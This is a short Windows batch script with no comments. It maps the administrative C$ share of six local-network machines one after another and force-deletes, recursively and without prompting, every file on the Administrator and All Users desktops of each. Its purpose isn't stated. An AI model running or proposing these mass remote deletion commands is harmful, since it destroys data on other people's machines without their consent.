cd\
net use u: \\192.168.1.13\c$
u:
cd\
cd documents and settings\administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use v: \\192.168.1.14\c$
v:
cd\
cd documents and settings\administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use x: \\192.168.1.15\c$
x:
cd\
cd documents and settings\administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use z: \\192.168.1.16\c$
z:
cd\
cd documents and settings\administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use y: \\192.168.1.17\c$
y:
cd\
cd documents and settings\administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*

net use w: \\192.168.1.18\c$
w:
cd\
cd documents and settings\administrator\desktop
del  /q /f /s  *.*
cd..
cd..
cd all users\desktop
del  /q /f /s  *.*


pause

net use * /delete /y